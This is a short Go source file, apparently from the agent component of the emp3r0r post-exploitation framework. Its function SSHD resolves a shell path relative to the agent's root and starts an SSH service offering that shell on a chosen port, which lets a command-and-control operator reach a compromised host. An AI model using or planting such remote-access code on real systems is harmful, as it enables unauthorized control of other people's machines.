package agent

import (
	"fmt"
	"path/filepath"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func SSHD(shell, port string, args []string) (err error) {
	if shell == "" {
		return fmt.Errorf("please specify a shell to use")
	}
	if strings.TrimSpace(strings.Join(args, " ")) == "--" {
		args = []string{""}
	}

	// CC doesn't know where the agent root is, so we need to prepend it
	if strings.HasPrefix(shell, util.FileBaseName(RuntimeConfig.AgentRoot)) {
		shell = fmt.Sprintf("%s/%s", filepath.Dir(RuntimeConfig.AgentRoot), shell)
	}

	return crossPlatformSSHD(shell, port, args)
}
